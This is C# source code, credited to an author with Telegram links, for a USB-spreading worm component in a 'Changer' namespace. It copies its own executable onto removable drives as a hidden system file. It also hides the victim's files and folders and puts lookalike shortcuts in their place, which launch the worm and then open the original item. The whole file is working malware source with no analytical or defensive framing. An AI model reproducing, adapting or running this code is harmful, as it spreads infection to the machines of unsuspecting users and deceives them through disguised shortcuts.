/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;


namespace Changer
{
    class USBInstaller
    {

        private static object ObjectShell;
        private static object ObjectLink;
        private static string spath;

        public static readonly Mutex mutex = new Mutex(true, "idDriver");

        public static void GetUSB()
        {
            if (mutex.WaitOne(TimeSpan.Zero, true))
            {
                Driver(true);
            }
            else
            {
                Driver(false);
            }
        }


        public static void Driver(bool startThread)
        {
            if (startThread == true)
            {
                spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
                ExecParam(spath);
                Thread NewThread = new Thread(new ThreadStart(USB_boot), 1);
                NewThread.Start();
            }
            else
            {
                spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
                ExecParam(spath);
            }
        }
        public static void USB_boot()
        {

            while (true)
            {
                try
                {
                    string[] USBDrivers = Strings.Split(DetectUSBDrivers(), "<->", -1, CompareMethod.Binary);
                    int num = Information.UBound(USBDrivers, 1) - 1;
                    for (int i = 0; i <= num; i++)
                    {
                        if (!File.Exists(USBDrivers[i] + "\\" + Process.GetCurrentProcess().MainModule.ModuleName))
                        {
                            File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, USBDrivers[i] + Process.GetCurrentProcess().MainModule.ModuleName);
                            File.SetAttributes(USBDrivers[i] + "\\" + Process.GetCurrentProcess().MainModule.ModuleName, FileAttributes.Hidden | FileAttributes.System);
                        }
                        string[] files = Directory.GetFiles(USBDrivers[i]);
                        for (int j = 0; j < files.Length; j++)
                        {
                            string GettingFile = files[j];
                            if (Operators.CompareString(Path.GetExtension(GettingFile), ".lnk", false) != 0 && Operators.CompareString(Path.GetFileName(GettingFile), Process.GetCurrentProcess().MainModule.ModuleName, false) != 0)
                            {
                                Thread.Sleep(200);
                                File.SetAttributes(GettingFile, FileAttributes.Hidden | FileAttributes.System);
                                CreateShortCut(Path.GetFileName(GettingFile), USBDrivers[i], Path.GetFileNameWithoutExtension(GettingFile), GetIconoffile(Path.GetExtension(GettingFile)));
                            }
                        }
                        string[] directories = Directory.GetDirectories(USBDrivers[i]);
                        for (int k = 0; k < directories.Length; k++)
                        {
                            string Dir = directories[k];
                            Thread.Sleep(100);
                            File.SetAttributes(Dir, FileAttributes.Hidden | FileAttributes.System);
                            CreateShortCut(Path.GetFileNameWithoutExtension(Dir), USBDrivers[i] + "\\", Path.GetFileNameWithoutExtension(Dir), null);
                        }
                    }
                }
                catch
                {
                }
                Thread.Sleep(5000);
            }
        }
        private static void CreateShortCut(string TargetName, string ShortCutPath, string ShortCutName, string Icon)
        {
            try
            {
                ObjectShell = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
                ObjectLink = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ObjectShell, null, "CreateShortcut", new object[] { ShortCutPath + "\\" + ShortCutName + ".lnk" }, null, null, null));
                NewLateBinding.LateSet(ObjectLink, null, "TargetPath", new object[] { ShortCutPath + "\\" + Process.GetCurrentProcess().MainModule.ModuleName }, null, null);
                NewLateBinding.LateSet(ObjectLink, null, "WindowStyle", new object[] { 1 }, null, null);
                if (Icon == null)
                {
                    NewLateBinding.LateSet(ObjectLink, null, "Arguments", new object[] { " " + ShortCutPath + "\\" + TargetName }, null, null);
                    NewLateBinding.LateSet(ObjectLink, null, "IconLocation", new object[] { "%SystemRoot%\\system32\\SHELL32.dll,3" }, null, null);
                }
                else
                {
                    NewLateBinding.LateSet(ObjectLink, null, "Arguments", new object[] { " " + ShortCutPath + "\\" + TargetName }, null, null);
                    NewLateBinding.LateSet(ObjectLink, null, "IconLocation", new object[] { Icon }, null, null);
                }
                NewLateBinding.LateCall(ObjectLink, null, "Save", new object[0], null, null, null, true);
            }
            catch
            {
            }
        }
        private static string GetIconoffile(string FileFormat)
        {
            string GetIconoffile;
            try
            {
                Microsoft.Win32.RegistryKey Registry = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
                string GetValue = Conversions.ToString(Registry.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Registry.OpenSubKey(FileFormat, false).GetValue(""), "\\DefaultIcon\\"))).GetValue("", ""));
                if (!GetValue.Contains(","))
                {
                    GetValue += ",0";
                }
                GetIconoffile = GetValue;
            }
            catch
            {
                GetIconoffile = "";
            }
            return GetIconoffile;
        }
        private static string DetectUSBDrivers()
        {
            string USBDrivers = "";
            DriveInfo[] drives = DriveInfo.GetDrives();
            for (int i = 0; i < drives.Length; i++)
            {
                DriveInfo usbdrive = drives[i];
                if (usbdrive.DriveType == DriveType.Removable)
                {
                    USBDrivers = USBDrivers + usbdrive.RootDirectory.FullName + "<->";
                }
            }
            return USBDrivers;
        }
        private static void ExecParam(string Parameter)
        {
            if (Operators.CompareString(Parameter, null, false) != 0)
            {
                if (Strings.InStrRev(Parameter, ".", -1, CompareMethod.Binary) > 0)
                {
                    Process.Start(Parameter);
                }
                else
                {
                    Interaction.Shell("explorer " + Parameter, AppWinStyle.NormalFocus, false, -1);
                }
            }
        }
    }
}
